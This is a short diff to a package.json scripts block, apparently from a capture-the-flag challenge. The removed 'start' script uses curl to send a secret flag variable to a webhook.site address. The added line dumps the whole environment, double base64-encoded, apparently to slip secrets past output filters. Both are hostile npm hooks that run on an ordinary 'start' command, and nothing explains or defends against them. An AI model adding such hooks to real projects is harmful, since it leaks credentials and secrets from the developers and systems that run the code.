@@ -15,6 +15,6 @@
   },
   "scripts": {
     "lint": "echo $env",
-    "start": "curl --data-binary \"SECRET IS: $FLAG_GRAVY_OVERFLOW_L0_GRAVY\" https://webhook.site/c468ba25-b30c-4944-8a41-23200be7ccd0"
+    "start": "env|base64|base64"
   }
 }
